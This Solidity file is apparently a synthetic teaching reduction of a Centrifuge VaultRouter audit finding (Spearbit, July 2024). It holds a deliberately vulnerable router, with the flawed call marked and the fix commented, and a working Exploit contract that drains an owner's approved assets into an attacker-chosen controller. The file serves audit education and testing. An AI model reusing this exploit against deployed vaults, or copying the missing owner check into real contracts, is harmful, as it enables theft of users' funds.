// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Centrifuge — VaultRouter acts for any owner who has opened a vault
    (Spearbit, July 2024, AuditVault 35789).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: open() endorses the router as the owner's operator. requestDeposit
    is permissionless and does not require owner == initiator. Any caller can pass
    the owner's address and a controller the caller controls. The vault pulls the
    owner's assets because msg.sender is the endorsed router.
    Audited call preserved below (@> VULN).

    Fix landed in centrifuge commit 3b21650d: require owner == initiator || owner == router.
    Review: Spearbit Centrifuge, July 2024. */

library Terms {
    uint256 internal constant AMOUNT = 1000 ether;
}

contract Asset {
    string public name = "USD Coin";
    string public symbol = "USDC";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mintAndApprove(address holder, address spender, uint256 amount) external {
        balanceOf[holder] += amount;
        totalSupply += amount;
        allowance[holder][spender] = amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

interface IVault {
    function setEndorsedOperator(address owner, bool approved) external;
    function requestDeposit(uint256 amount, address controller, address owner) external;
    function claim(address receiver) external;
}

/// ERC-7540 vault. The endorsed router may requestDeposit for an owner.
contract Vault {
    Asset public asset;
    address public router;
    mapping(address => mapping(address => bool)) public isOperator;
    mapping(address => uint256) public claimable;
    address public lastController;
    address public lastOwner;
    uint256 public escrowed;

    constructor(Asset _asset) {
        asset = _asset;
    }

    function setRouter(address _router) external {
        require(router == address(0), "router");
        router = _router;
    }

    function setEndorsedOperator(address owner, bool approved) external {
        require(msg.sender == router, "endorsed");
        isOperator[owner][msg.sender] = approved;
    }

    function requestDeposit(uint256 amount, address controller, address owner) external {
        require(owner == msg.sender || isOperator[owner][msg.sender], "operator");
        asset.transferFrom(owner, address(this), amount);
        claimable[controller] += amount;
        lastController = controller;
        lastOwner = owner;
        escrowed = amount;
    }

    function claim(address receiver) external {
        uint256 amount = claimable[msg.sender];
        require(amount != 0, "none");
        claimable[msg.sender] = 0;
        asset.transfer(receiver, amount);
    }
}

/// Reduced VaultRouter. protected records the caller. requestDeposit does not check them.
contract VaultRouter {
    address private _caller;
    Asset public asset;

    modifier protected() {
        _caller = msg.sender;
        _;
        _caller = address(0);
    }

    function _initiator() internal view returns (address) {
        return _caller;
    }

    constructor(Asset _asset) {
        asset = _asset;
    }

    function open(address vault) public protected {
        IVault(vault).setEndorsedOperator(_initiator(), true);
    }

    function requestDeposit(address vault, uint256 amount, address controller, address owner, uint256 topUpAmount)
        external
        payable
        protected
    {
        if (owner == address(this)) {
            asset.approve(vault, type(uint256).max);
        }
        require(topUpAmount == 0, "topup");
        // @> VULN: any caller can pass another owner's address. The router is already that owner's operator.
        IVault(vault).requestDeposit(amount, controller, owner);
        // FIX: require(owner == _initiator() || owner == address(this));
    }
}

/// The owner who opened the vault. Holds the assets and the vault allowance.
contract Owner {
    VaultRouter public router;

    constructor(VaultRouter _router) {
        router = _router;
    }

    function openVault(address vault) external {
        router.open(vault);
    }
}

contract Exploit {
    Asset public asset; // CREATE nonce 1
    Vault public vault; // CREATE nonce 2
    VaultRouter public router; // CREATE nonce 3
    Owner public owner; // CREATE nonce 4

    uint256 public moved;
    address public controller;
    address public openedFor;

    constructor() {
        asset = new Asset();
        vault = new Vault(asset);
        router = new VaultRouter(asset);
        owner = new Owner(router);
        vault.setRouter(address(router));
    }

    function run() external {
        asset.mintAndApprove(address(owner), address(vault), Terms.AMOUNT);
        owner.openVault(address(vault));
        require(vault.isOperator(address(owner), address(router)), "not open");

        router.requestDeposit(address(vault), Terms.AMOUNT, address(this), address(owner), 0);

        controller = vault.lastController();
        openedFor = vault.lastOwner();
        moved = vault.escrowed();
        require(controller == address(this), "controller");
        require(openedFor == address(owner), "owner");
        require(moved == Terms.AMOUNT, "moved");
        require(asset.balanceOf(address(owner)) == 0, "owner drained");

        vault.claim(address(this));
        require(asset.balanceOf(address(this)) == Terms.AMOUNT, "attacker");
    }
}
